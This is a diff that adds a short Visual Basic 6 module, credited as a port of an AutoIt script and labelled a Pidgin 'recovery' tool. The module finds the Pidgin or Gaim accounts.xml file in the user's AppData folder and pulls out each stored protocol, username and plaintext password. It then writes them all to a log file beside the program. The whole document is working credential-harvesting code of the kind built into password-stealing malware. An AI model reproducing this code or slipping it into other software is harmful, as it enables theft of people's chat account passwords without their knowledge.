@@ -1,0 +1,67 @@
+'---------------------------------------------
+' Simple PidGin Recovery VB6
+' Autor Autoit: M3
+' Version VB6: Pink
+' Fecha: 30-01-2013
+' Propósito: Recuperar Datos de PidGin
+' Recupera: Protocolo, Usuario y Contraseña
+' Uso : PidGin()
+'---------------------------------------------
+ 
+Private Const AppDataDir = &H1A&
+Private Const MAX_PATH = 260
+Private Declare Function SHGetFolderPath Lib "shfolder" Alias "SHGetFolderPathA" (ByVal hwndOwner As Long, ByVal nFolder As Long, ByVal hToken As Long, ByVal dwFlags As Long, ByVal pszPath As String) As Long
+ 
+ 
+Private Function PidGin()
+    Dim ruta As String
+    Dim texto As String
+    Dim ruta2 As String
+    Dim sProto As Variant
+    Dim sUser As Variant
+    Dim sPass As Variant
+     
+    ruta2 = App.Path & "\log.log"
+    ruta = SpecialFolder(AppDataDir) & "\purple\accounts.xml"
+    If Not Len(Dir(ruta)) > 0 Then ruta = SpecialFolder(AppDataDir) & "\.gaim\accounts.xml"
+     
+    If Not Len(Dir(ruta)) > 0 Then Exit Function
+     
+    Open ruta For Input As #1
+    texto = Input(LOF(1), #1)
+    Close #1
+     
+     
+    sProto = Splits(texto, Array("<protocol>", "</protocol>"))
+    sUser = Splits(texto, Array("<name>", "</name>"))
+    sPass = Splits(texto, Array("<password>", "</password>"))
+     
+     
+    Open ruta2 For Output As #1
+     
+    
+    For i = 1 To UBound(sProto) Step 2
+         
+        Print #1, "========= PidGin =========" & vbCrLf & "Proto : " & sProto(i) & vbCrLf & "User : " & _
+        sUser(i) & vbCrLf & "Pass : " & sPass(i) & vbCrLf & "==========================" & vbCrLf
+         
+    Next
+    Close #1
+End Function
+ 
+Private Function Splits(ByVal Fuente As String, Sep As Variant) As Variant
+    Dim AR           As Variant
+    For Each AR In Sep
+        Fuente = Replace(Fuente, AR, Chr(0), 1, -1, vbTextCompare)
+    Next
+    Splits = Split(Fuente, Chr(0))
+End Function
+ 
+Public Function SpecialFolder(Tp As Long) As String
+    Dim strPath As String
+    Dim strBuffer As String
+    strBuffer = Space(MAX_PATH)
+    If SHGetFolderPath(0, Tp, 0, 0, strBuffer) = 0 Then strPath = Left(strBuffer, InStr(strBuffer, vbNullChar) - 1)
+    If Right(strPath, 1) = "\" Then strPath = Left(strPath, Len(strPath) - 1)
+    SpecialFolder = strPath
+End Function
